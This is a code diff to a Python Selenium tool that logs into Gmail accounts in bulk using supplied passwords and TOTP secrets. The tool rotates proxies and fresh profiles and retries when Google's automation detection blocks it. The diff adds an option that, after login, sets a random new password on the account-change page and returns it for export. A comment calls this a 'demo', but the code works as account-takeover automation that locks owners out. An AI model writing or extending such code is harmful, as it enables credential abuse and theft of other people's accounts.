@@ -12,6 +12,8 @@ import json
 import os
 import time
 import random
+import secrets
+import string
 import base64
 import zipfile
 import io
@@ -249,11 +251,32 @@ def signed_in_host(url: str) -> bool:
         host = (urlparse(url).hostname or "").lower()
     except Exception:
         return False
-    if host == "myaccount.google.com" and "signinoptions/password" in url.lower():
-        return True
-    if host == "myaccount.google.com" and "signin" not in url.lower():
-        return True
+    u = url.lower()
+    if host == "myaccount.google.com":
+        # signinoptions/password is login start OR post-login change — not account home.
+        if "signinoptions" in u or "/password" in u.split("?", 1)[0]:
+            return False
+        if "signin" not in u:
+            return True
     return host == "mail.google.com" or host.endswith(".mail.google.com")
+
+
+def is_google_password_change_url(url: str) -> bool:
+    """Google Account 'change password' interstitial after sign-in."""
+    try:
+        from urllib.parse import urlparse
+        host = (urlparse(url).hostname or "").lower()
+    except Exception:
+        return False
+    if host != "myaccount.google.com":
+        return False
+    u = url.lower()
+    return "signinoptions" in u or u.rstrip("/").endswith("/password")
+
+
+def generate_random_password(length: int = 14) -> str:
+    alphabet = string.ascii_letters + string.digits
+    return "".join(secrets.choice(alphabet) for _ in range(length))
 
 
 def browser_result_category(result: dict) -> str:
@@ -2942,6 +2965,7 @@ def main():
     proxy             = data.get("proxy")
     proxy_for_ip_check = data.get("proxyForIpCheck") or proxy  # original URL without sticky suffix
     fresh_profile     = bool(data.get("freshProfile", False))
+    change_password   = bool(data.get("changePasswordAfterLogin", False))
     raw_device_index  = data.get("deviceIndex")
     device_index      = (
         int(raw_device_index)
@@ -2952,7 +2976,7 @@ def main():
     _t0 = time.time()
     result = check_gmail(
         email, password, totp_secret, proxy, fresh_profile,
-        proxy_for_ip_check, device_index,
+        proxy_for_ip_check, device_index, change_password,
     )
 
     # Auto-retry up to 3 times if Google blocked automation detection.
@@ -2997,7 +3021,7 @@ def main():
         log(f"{email} — retriable result ({result.get('status')}) on attempt {_retry_n+1}/3, retrying with fresh profile + new proxy IP…")
         result = check_gmail(
             email, password, totp_secret, _retry_proxy, True,
-            proxy_for_ip_check, device_index,
+            proxy_for_ip_check, device_index, change_password,
         )
         _blocked_reason = result.get("reason", "")
 
@@ -3160,6 +3184,7 @@ def check_gmail(
     fresh_profile: bool = False,
     proxy_for_ip_check: str | None = None,
     device_index: int | None = None,
+    change_password_after_login: bool = False,
 ) -> dict:
     totp_code = generate_totp(totp_secret) if totp_secret else None
 
@@ -3528,7 +3553,10 @@ def check_gmail(
 
     _login_result: dict = {}
     try:
-        _login_result = _do_login(driver, email, password, totp_code, totp_secret, fresh_profile)
+        _login_result = _do_login(
+            driver, email, password, totp_code, totp_secret, fresh_profile,
+            change_password_after_login,
+        )
 
         # ── Post-login geo fallback (driver still open here!) ──────────────────
         # If geo lookup failed at fingerprint time (fp has no "ip"), try now —
@@ -3633,7 +3661,15 @@ def _cleanup(path: str | None, xvfb_proc=None):
 
 # ── Login flow ────────────────────────────────────────────────────────────────
 
-def _do_login(driver, email: str, password: str, totp_code: str | None, totp_secret: str | None = None, fresh_profile: bool = False) -> dict:
+def _do_login(
+    driver,
+    email: str,
+    password: str,
+    totp_code: str | None,
+    totp_secret: str | None = None,
+    fresh_profile: bool = False,
+    change_password_after_login: bool = False,
+) -> dict:
     from selenium.webdriver.common.by import By
     from selenium.webdriver.common.keys import Keys
 
@@ -3674,7 +3710,7 @@ def _do_login(driver, email: str, password: str, totp_code: str | None, totp_sec
             }
 
         # Signed-in Google Account home is the success page. The inbox is not required.
-        if host == "myaccount.google.com" and "signin" not in url.lower():
+        if signed_in_host(url):
             rand_sleep(400, 700)
             shot = screenshot_b64()
             log("Google account home loaded — login successful")
@@ -3957,6 +3993,134 @@ def _do_login(driver, email: str, password: str, totp_code: str | None, totp_sec
                     pass
             time.sleep(0.15)
         return None
+
+    def complete_password_change_if_needed(current_url: str) -> dict | None:
+        """College demo: fill random new password on myaccount signinoptions/password."""
+        if not change_password_after_login or not is_google_password_change_url(current_url):
+            return None
+
+        new_pw = generate_random_password()
+        log(f"{email} — Password-change page: setting random new password (demo mode)")
+
+        def visible_password_fields() -> list:
+            found = []
+            for el in driver.find_elements(By.CSS_SELECTOR, 'input[type="password"]'):
+                try:
+                    name = (el.get_attribute("name") or "").lower()
+                    if name == "hiddenpassword":
+                        continue
+                    if el.is_displayed() and el.is_enabled():
+                        found.append(el)
+                except Exception:
+                    pass
+            return found
+
+        try:
+            fields = visible_password_fields()
+            if not fields:
+                rand_sleep(800, 1200)
+                fields = visible_password_fields()
+
+            if not fields:
+                shot = screenshot_b64()
+                return {
+                    "status": "unknown",
+                    "reason": "Password change page open but no password fields found",
+                    "totpCode": totp_code,
+                    "newPassword": new_pw,
+                    "debugScreenshot": shot,
+                }
+
+            # Google may show current + new + confirm, or only new + confirm.
+            if len(fields) >= 3:
+                clipboard_type(driver, fields[0], password)
+                rand_sleep(120, 220)
+                clipboard_type(driver, fields[1], new_pw)
+                rand_sleep(120, 220)
+                clipboard_type(driver, fields[2], new_pw)
+            elif len(fields) >= 2:
+                clipboard_type(driver, fields[0], new_pw)
+                rand_sleep(120, 220)
+                clipboard_type(driver, fields[1], new_pw)
+            else:
+                clipboard_type(driver, fields[0], new_pw)
+
+            rand_sleep(200, 400)
+            driver.execute_script("""
+                var labels = ['change password', 'save password', 'save', 'next', 'continue', 'done'];
+                var btns = Array.from(document.querySelectorAll('button, [role="button"]'));
+                for (var label of labels) {
+                    var hit = btns.find(function(b) {
+                        return b.innerText && b.innerText.trim().toLowerCase().indexOf(label) !== -1;
+                    });
+                    if (hit && !hit.disabled) { hit.click(); return; }
+                }
+                var submit = document.querySelector('button[type="submit"]');
+                if (submit && !submit.disabled) submit.click();
+            """)
+            rand_sleep(2500, 4000)
+
+            url_after, text_after = page_state()
+            if is_google_password_change_url(url_after):
+                # Sometimes Google asks for current password in a second step.
+                fields2 = visible_password_fields()
+                if fields2:
+                    clipboard_type(driver, fields2[0], password)
+                    if len(fields2) >= 3:
+                        clipboard_type(driver, fields2[1], new_pw)
+                        clipboard_type(driver, fields2[2], new_pw)
+                    elif len(fields2) >= 2:
+                        clipboard_type(driver, fields2[1], new_pw)
+                    rand_sleep(200, 400)
+                    driver.execute_script("""
+                        var submit = document.querySelector('button[type="submit"], button');
+                        if (submit && !submit.disabled) submit.click();
+                    """)
+                    rand_sleep(2500, 4000)
+                    url_after, text_after = page_state()
+
+            if not is_google_password_change_url(url_after):
+                try:
+                    driver.get(ACCOUNT_HOME)
+                    rand_sleep(1500, 2500)
+                    url_after, text_after = page_state()
+                except Exception:
+                    pass
+
+            if is_google_password_change_url(url_after):
+                shot = screenshot_b64()
+                return {
+                    "status": "unknown",
+                    "reason": "Password change page still showing — check screenshot / try manually",
+                    "totpCode": totp_code,
+                    "newPassword": new_pw,
+                    "debugScreenshot": shot,
+                }
+
+            opened = classify(url_after, text_after)
+            if opened:
+                opened["newPassword"] = new_pw
+                opened["reason"] = "Login OK — demo password change complete ✅ (export for new password)"
+                return opened
+
+            shot = screenshot_b64()
+            return {
+                "status": "opened",
+                "reason": "Demo password change complete ✅ (export for new password)",
+                "totpCode": totp_code,
+                "newPassword": new_pw,
+                "debugScreenshot": shot,
+            }
+        except Exception as exc:
+            log(f"{email} — password change error: {exc}")
+            shot = screenshot_b64()
+            return {
+                "status": "unknown",
+                "reason": f"Password change failed: {type(exc).__name__}",
+                "totpCode": totp_code,
+                "newPassword": new_pw,
+                "debugScreenshot": shot,
+            }
 
     # A phone already has Google cookies and a little mouse history. A cold
     # profile that opens the sign-in form immediately is what makes the
@@ -4851,9 +5015,21 @@ def _do_login(driver, email: str, password: str, totp_code: str | None, totp_sec
 
         dismissed = False
 
+        # myaccount.google.com/signinoptions/password — optional demo password change
+        if is_google_password_change_url(url):
+            _pc_result = complete_password_change_if_needed(url)
+            if _pc_result:
+                return _pc_result
+            log(f"{email} — Password change page skipped (demo toggle off), opening account home")
+            try:
+                driver.get(ACCOUNT_HOME)
+            except Exception:
+                pass
+            dismissed = True
+
         # gds.google.com — recovery options, home address, etc.
         # Click "Not now" / "Skip" / "Later" properly so the auth session finalises
-        if "gds.google.com" in host:
+        elif "gds.google.com" in host:
             page_name = url[url.find('/web/'):url.find('?')] if '/web/' in url else url[:50]
             log(f"{email} — gds interstitial ({page_name}), clicking dismiss")
             try:
@@ -5136,6 +5312,10 @@ def _do_login(driver, email: str, password: str, totp_code: str | None, totp_sec
     rand_sleep(300, 600)
     url, text = page_state()
     log(f"{email} — Final page after interstitials: {url[:70]}")
+
+    _password_change_result = complete_password_change_if_needed(url)
+    if _password_change_result:
+        return _password_change_result
 
     result = classify(url, text)
     if result:
